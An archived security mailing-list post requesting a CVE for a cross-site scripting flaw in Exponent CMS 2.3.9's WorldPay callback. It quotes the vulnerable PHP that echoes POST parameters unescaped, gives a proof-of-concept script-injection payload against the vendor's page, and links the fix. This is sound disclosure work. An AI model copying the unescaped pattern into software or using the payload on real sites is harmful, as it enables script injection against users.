X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/21/2
Message-ID: <CAEiFw0UDwyLFxRK0PPVKVGA3+B112scA3M+sskZ6Q8-0K1vAuQ@mail.gmail.com>
Date: Wed, 21 Sep 2016 08:09:27 +0800
From: Carl Peng <felixk3y@...il.com>
To: oss-security@...ts.openwall.com
Subject: CVE request：Exponent CMS 2.3.9 xss vulnerability in worldpay
Content-Type: text/plain; charset=utf-8

Hi, I reported the following Cross Site Scripting vulnerability to the
ExponentCMS team on Sep 16, 2016:
vulnerability:
/external/worldpay/callback.php
line 7-11:
```
<head>
<meta http-equiv="refresh" content="2;url=<?php echo URL_FULL;
?>cart/preprocess?transStatus=<?php echo $_POST["transStatus"];
?>&transId=<?php echo $_POST["transId"]; ?>"> //xss
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
<title></title>
</head>
```
"transStatus", "transId" parameters are fail to sufficiently sanitize.

Proof of concept:
http://www.exponentcms.org/external/worldpay/callback.php
And post:transStatus="/><script>alert(/xss/)</script>


And Now, Cross Site Scripting vulnerability have been fixed.
https://exponentcms.lighthouseapp.com/projects/61783/changesets/5e4b749bff4314f2a22c7afef903c67ccb862caf
https://github.com/exponentcms/exponent-cms/commit/5e4b749bff4314f2a22c7afef903c67ccb862caf

This issue was reported by Peng Hua of silence.com.cn Inc. and I would like
to request a CVE for this issue (if not done so).

Thank you.
---------------------------------http://www.silence.com.cn
penghua#silence.com.cn
PKAV Team

